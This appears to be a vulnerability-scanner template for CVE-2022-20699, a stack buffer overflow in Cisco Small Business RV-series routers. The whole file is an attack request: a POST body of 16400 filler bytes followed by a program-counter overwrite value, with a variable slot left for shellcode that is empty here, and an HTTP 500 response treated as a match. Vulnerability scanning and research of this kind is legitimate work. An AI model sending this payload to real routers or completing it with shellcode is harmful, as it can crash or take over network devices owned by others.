id: CVE-2022-20699
info:
  name: Cisco Small Business RV160, RV260, RV340, and RV345 Series Routers Stack-based Buffer Overflow (CVE-2022-20699)
  author: Phillipo
  severity: critical
  reference: https://github.com/rdomanski/Exploits_and_Advisories/blob/master/advisories/Pwn2Own/Austin2021/flashback_connects/flashback_connects.md

variables:
  shellcode: ''
  filler: "{{repeat('05', 16400)}}"
  pc: '98ed4a70'

http:
  - method: POST
    path:
      - "{{BaseURL}}/{{randstr(8)}}"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: "{{shellcode}}{{filler}}{{pc}}"
    unsafe: true

  matchers:
    - type: status
      status:
        - 500
